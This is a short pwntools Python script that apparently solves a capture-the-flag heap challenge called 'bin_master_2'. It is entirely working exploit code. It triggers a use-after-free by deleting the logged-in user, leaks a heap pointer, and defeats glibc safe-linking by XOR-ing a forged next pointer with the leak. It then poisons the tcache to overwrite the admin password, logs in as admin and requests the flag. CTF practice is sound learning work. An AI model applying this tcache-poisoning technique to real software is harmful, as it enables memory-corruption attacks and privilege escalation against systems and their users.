from pwn import *
from pwn import p64,u64

e = ELF('./bin_master_2',checksec=False)
p = e.process()

#add user
p.sendlineafter(b'>', b'2')
p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', b'ciao')
p.sendlineafter(b':', b'ciao')

#login
p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', b'ciao')
p.sendlineafter(b':', b'ciao')

#delete myself
p.sendlineafter(b'>', b'3')
p.sendlineafter(b'>', b'1')


#parse the heap
p.recvuntil(b'Welcome ')
leak = p.recvline().strip()
leak = u64(leak.ljust(8,b'\x00'))
next = leak<<12
next += 0x320
payload = next ^ leak
print(f"leak: {leak}")
payload = p64(payload)

#concatenate the heap chunks
p.sendlineafter(b'>', b'5')
p.sendafter(b':',payload)

#now adding the user modifies the admin password
p.sendlineafter(b'>', b'2')
p.sendlineafter(b':', b'ciao')
p.sendlineafter(b':', b'ciao')

#login as admin
p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', b'admin')
p.sendlineafter(b':', b'ciao')

#flag
p.sendlineafter(b'>', b'4')



p.interactive()

